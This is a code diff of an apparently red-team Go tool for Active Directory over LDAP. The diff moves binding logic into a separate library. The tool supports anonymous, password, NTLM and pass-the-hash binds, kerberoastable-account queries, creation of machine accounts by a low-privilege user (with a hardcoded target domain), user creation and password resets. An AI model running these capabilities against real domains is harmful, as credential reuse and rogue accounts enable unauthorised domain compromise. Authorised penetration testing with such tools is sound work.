@@ -1,28 +1,19 @@
 package main
 
 import (
-	"crypto/tls"
 	"fmt"
 	"log"
 	"os"
 	"strings"
+
 	//"github.com/jcmturner/gokrb5/v8/client"
+	"git.red.team/silversurfer/goldapquery"
 	"github.com/go-ldap/ldap/v3"
+
 	//"github.com/go-ldap/ldap/v3/gssapi"
 	"github.com/mjwhitta/cli"
 	"golang.org/x/term"
 	"golang.org/x/text/encoding/unicode"
-)
-
-type bindMode int
-
-const (
-	bindAnonymous = iota
-	bindPassword
-	bindDomain
-	bindDomainPTH
-	bindSASL
-	bindGSSAPI
 )
 
 /*
@@ -38,7 +29,7 @@ const (
 
 // Global state
 var state struct {
-	mode     bindMode
+	mode     goldapquery.BindMethod
 	password string
 }
 
@@ -58,7 +49,7 @@ var flags struct {
 	filter                  string
 	groups                  bool
 	groupswithmembers       bool
-	gssapi					bool
+	gssapi                  bool
 	kerberoastable          bool
 	ldapURL                 string
 	machineaccountquota     bool
@@ -166,7 +157,7 @@ func init() {
 	}
 
 	if flags.password {
-		state.mode = bindPassword
+		state.mode = goldapquery.MethodBindPassword
 		if flags.username == "" {
 			log.Fatal("[-] Username is empty, unable to continue")
 		}
@@ -181,14 +172,18 @@ func init() {
 	}
 
 	if flags.domain != "" {
-		state.mode = bindDomain
+		state.mode = goldapquery.MethodBindDomain
 		if flags.username == "" {
 			log.Fatal("[-] Username is empty, unable to continue")
 		}
 	}
 
 	if flags.pth != "" {
-		state.mode = bindDomainPTH
+		state.mode = goldapquery.MethodBindDomainPTH
+		if flags.domain == "" {
+			log.Fatal("[-] Must specify domain to PTH with BindDomain method\n")
+		}
+
 		if flags.username == "" {
 			log.Fatal("[-] Username is empty, unable to continue")
 		}
@@ -196,21 +191,19 @@ func init() {
 
 	if flags.basedn == "" {
 		log.Fatal("[-] A basedn will be required for any action")
-
 	}
-	
-	/*if flags.gssapi {
-		gssClient, err := gssapi.NewClientWithPassword(
-        flags.username,     // Kerberos principal name
-        flags.domain,    // Kerberos realm
-        state.password,     // Kerberos password
-        "/etc/krb5.conf",    // krb5 configuration file path
-        client.DisablePAFXFAST(true), // Optional: disable FAST if your realm needs it
-    )
-	check(err)
-	defer gssClient.Close()
-	}*/
 
+	/*if flags.gssapi {
+			gssClient, err := gssapi.NewClientWithPassword(
+	        flags.username,     // Kerberos principal name
+	        flags.domain,    // Kerberos realm
+	        state.password,     // Kerberos password
+	        "/etc/krb5.conf",    // krb5 configuration file path
+	        client.DisablePAFXFAST(true), // Optional: disable FAST if your realm needs it
+	    )
+		check(err)
+		defer gssClient.Close()
+		}*/
 }
 
 // Eventually build this up to take all supported parameters, just an initial shell so far with support for base, scope, filter and attributes.
@@ -224,44 +217,34 @@ func ldapsearch(l *ldap.Conn, base string, searchscope int, filter string, attri
 func main() {
 	var l *ldap.Conn
 	var err error
-	fmt.Printf("[+] skipVerify currently set to %t\n", flags.skipVerify)
-	if strings.HasPrefix(flags.ldapURL, "ldaps:") {
-		//ServerName: "0.0.0.0", MaxVersion: tls.VersionTLS12
-		l, err = ldap.DialURL(flags.ldapURL, ldap.DialWithTLSConfig(&tls.Config{InsecureSkipVerify: flags.skipVerify}))
-	} else {
-		l, err = ldap.DialURL(flags.ldapURL)
-	}
-	check(err)
-	defer l.Close()
+	goldapquery.SkipVerify = flags.skipVerify
 
-	
 	// Attempt anonymous bind, check for flag
 	switch state.mode {
-	case bindAnonymous:
+	case goldapquery.MethodBindAnonymous:
 		fmt.Printf("[+] Attempting anonymous bind to %s\n", flags.ldapURL)
-		err = l.UnauthenticatedBind(flags.username)
+		l, err = goldapquery.BindAnonymous(flags.ldapURL, flags.username)
 
-	case bindPassword:
+	case goldapquery.MethodBindPassword:
 		fmt.Printf("[+] Attempting bind with credentials to %s\n", flags.ldapURL)
-		err = l.Bind(flags.username, state.password)
+		l, err = goldapquery.BindPassword(flags.ldapURL, flags.username, state.password)
 
-	case bindDomain:
+	case goldapquery.MethodBindDomain:
 		fmt.Printf("[+] Attempting NTLM bind to %s\n", flags.ldapURL)
-		err = l.NTLMBind(flags.domain, flags.username, state.password)
+		l, err = goldapquery.BindDomain(flags.ldapURL, flags.domain, flags.username, state.password)
 
-	case bindDomainPTH:
+	case goldapquery.MethodBindDomainPTH:
 		fmt.Printf("[+] Attempting NTLM Pass The Hash bind to %s\n", flags.ldapURL)
-		err = l.NTLMBindWithHash(flags.domain, flags.username, flags.pth)
+		l, err = goldapquery.BindDomainPTH(flags.ldapURL, flags.domain, flags.username, flags.pth)
 
-	/*case bindGSSAPI:
+		/*case bindGSSAPI:
 		fmt.Printf("[+] Attempting GSSAPI bind to %s\n", flags.ldapURL)
 		err = l.GSSAPIBindRequest(gssClient)
 		check(err)
 		fmt.Println("[+] GSSAPI bind successful")*/
-}
-	
-
+	}
 	check(err)
+	defer l.Close()
 	fmt.Printf("[+] Successfully connected to %s\n", flags.ldapURL)
 
 	// We have so much power here with the filters. Basically any filter that works in ldapsearch should work here.
@@ -286,18 +269,18 @@ func main() {
 	case flags.addmachinelowpriv != "":
 		machinename, machinepass, _ := strings.Cut(flags.addmachinelowpriv, " ")
 		fmt.Printf("[+] Adding machine account %s with password %s\n", machinename, machinepass)
-		//addReq := ldap.NewAddRequest("CN="+machinename+",CN=Computers,"+flags.basedn, []ldap.Control{})
-		//addReq.Attribute("objectClass", []string{"top", "person", "organizationalPerson", "user", "computer"})
-		//addReq.Attribute("sAMAccountName", []string{machinename + "$"})
-		//addReq.Attribute("userAccountControl", []string{"4096"}) // WORKSTATION_TRUST_ACCOUNT
+		// addReq := ldap.NewAddRequest("CN="+machinename+",CN=Computers,"+flags.basedn, []ldap.Control{})
+		// addReq.Attribute("objectClass", []string{"top", "person", "organizationalPerson", "user", "computer"})
+		// addReq.Attribute("sAMAccountName", []string{machinename + "$"})
+		// addReq.Attribute("userAccountControl", []string{"4096"}) // WORKSTATION_TRUST_ACCOUNT
 		addReq := ldap.NewAddRequest("CN=TESTPC,CN=Computers,DC=ad,DC=sostup,DC=id", nil)
 		addReq.Attribute("objectClass", []string{"computer"})
 		addReq.Attribute("sAMAccountName", []string{"TESTPC$"})
 		addReq.Attribute("userAccountControl", []string{"4096"})
 		addReq.Attribute("dNSHostName", []string{"TESTPC.ad.sostup.id"})
-		//addReq.Attribute("servicePrincipalName", []string{"HOST/testdudefd.ad.sostup.id", "HOST/testdudefd", "RestrictedKrbHost/testdudefd.ad.sostup.id", "RestrictedKrbHost/testdudefd"})
-		//encodedPassword := encodePassword(machinepass)
-		//addReq.Attribute("unicodePWD", []string{encodedPassword})
+		// addReq.Attribute("servicePrincipalName", []string{"HOST/testdudefd.ad.sostup.id", "HOST/testdudefd", "RestrictedKrbHost/testdudefd.ad.sostup.id", "RestrictedKrbHost/testdudefd"})
+		// encodedPassword := encodePassword(machinepass)
+		// addReq.Attribute("unicodePWD", []string{encodedPassword})
 		err = l.Add(addReq)
 		check(err)
 		fmt.Printf("[+] Added machine account %s with a low priv account successfully with password %s\n", machinename, machinepass)
@@ -315,10 +298,10 @@ func main() {
 		addReq.Attribute("objectClass", []string{"top", "organizationalPerson", "user", "person"})
 		addReq.Attribute("sAMAccountName", []string{detailstopass[0]})
 		addReq.Attribute("sn", []string{detailstopass[0]})
-		//Create the account disabled....
+		// Create the account disabled....
 		addReq.Attribute("userAccountControl", []string{"514"})
 		addReq.Attribute("userPrincipalName", []string{detailstopass[1]})
-		//addReq.Attributes = attrs
+		// addReq.Attributes = attrs
 		err = l.Add(addReq)
 		check(err)
 		fmt.Printf("[+] Successfully added user account %s\n", detailstopass[0])
@@ -328,8 +311,8 @@ func main() {
 		newpwdEncoded, err := utf16.NewEncoder().String(fmt.Sprintf("%q", detailstopass[2]))
 		check(err)
 		passwordSet.Replace("unicodePwd", []string{newpwdEncoded})
-		//debugging crap
-		//log.Printf("The stuff %s", *passwordModify)
+		// debugging crap
+		// log.Printf("The stuff %s", *passwordModify)
 		err = l.Modify(passwordSet)
 		check(err)
 		if err == nil {
@@ -358,8 +341,8 @@ func main() {
 		check(err)
 		passwordModify := ldap.NewModifyRequest("cn="+detailstopass[0]+",cn=Users,"+flags.basedn, nil)
 		passwordModify.Replace("unicodePwd", []string{newpwdEncoded})
-		//debugging crap
-		//log.Printf("The stuff %s", *passwordModify)
+		// debugging crap
+		// log.Printf("The stuff %s", *passwordModify)
 		err = l.Modify(passwordModify)
 		check(err)
 		if err == nil {
